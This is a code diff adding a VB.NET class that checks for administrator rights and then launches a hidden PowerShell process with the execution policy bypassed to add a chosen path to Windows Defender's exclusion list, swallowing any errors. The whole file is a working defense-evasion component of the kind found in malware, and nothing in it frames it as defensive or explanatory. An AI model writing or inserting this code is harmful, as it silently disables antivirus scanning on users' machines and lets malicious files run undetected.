@@ -1,0 +1,18 @@
+Imports System.Security.Principal
+
+Public Class Exclusion
+    Public Shared Function Exclusion(ByVal Path As String)
+        Try
+            Dim UAC As Boolean = New WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)
+            If UAC Then
+                Dim StartInfo As New ProcessStartInfo
+                StartInfo.FileName = "powershell.exe"
+                StartInfo.WindowStyle = ProcessWindowStyle.Hidden
+                StartInfo.Arguments = "-ExecutionPolicy Bypass Add-MpPreference -ExclusionPath " & "'" & Path & "'"
+                Process.Start(StartInfo).WaitForExit()
+            End If
+        Catch
+        End Try
+    End Function
+End Class
+
